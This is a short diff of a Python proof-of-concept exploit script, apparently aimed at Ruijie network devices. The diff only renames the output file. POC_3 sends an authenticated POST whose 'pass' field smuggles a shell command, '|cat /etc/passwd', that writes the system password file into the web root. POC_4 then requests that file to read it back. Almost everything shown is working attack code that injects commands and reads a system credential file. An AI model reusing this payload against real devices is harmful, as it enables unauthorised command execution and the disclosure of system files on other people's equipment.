@@ -64,7 +64,7 @@ def POC_3(target_url, ruijie_cookie):
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Cookie": "{}".format(ruijie_cookie)
     }
-    data = 'pass=|cat /etc/passwd>../test_test.txt'
+    data = 'pass=|cat /etc/passwd>../pq_test.txt'
     try:
         response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
         print("\033[36m[o] 正在执行 cat /etc/passwd..... \033[0m".format(target_url))
@@ -75,7 +75,7 @@ def POC_3(target_url, ruijie_cookie):
         sys.exit(0)
 
 def POC_4(target_url, ruijie_cookie):
-    vuln_url = target_url + "/test_test.txt"
+    vuln_url = target_url + "/pq_test.txt"
     headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                 "Content-Type": "application/x-www-form-urlencoded",
